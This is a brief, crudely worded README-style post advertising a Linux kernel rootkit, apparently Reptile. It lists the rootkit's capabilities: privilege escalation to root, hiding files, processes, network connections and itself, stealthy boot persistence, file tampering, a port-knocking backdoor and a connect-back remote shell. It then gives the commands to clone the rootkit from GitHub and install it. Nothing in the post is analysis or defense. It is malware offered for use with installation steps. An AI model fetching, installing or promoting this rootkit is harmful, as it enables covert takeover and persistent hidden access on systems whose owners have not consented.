*Disclaimer*
I really don't give two shits what you do with this rootkit it's pretty shit lol.
 


-Tested On

- Debian: 4.9.0-8-amd64
- Ubuntu 18.04.1 LTS

- Features

- Give root to unprivileged users
- Hide files and directories
- Hide processes
- Hide himself
- Hide TCP/UDP connections
- Hidden boot persistence
- File content tampering
- Some obfuscation techniques
- ICMP/UDP/TCP port-knocking backdoor
- Full TTY/PTY shell with file transfer
- Client to handle Reptile Shell
- Shell connect back each X times (not default)
   
- Install (If you can't figure this out then you're a brain dead troglidyte)

apt-get install linux-headers-$(uname -r)
git clone https://github.com/f0rb1dd3n/Reptile.git
cd Reptile
./setup.sh install


- Uninstall: 

./setup.sh remove

- Some shit are based on other rootkits. 

- Creds: apt
- XMPP: apt1337@creep.im

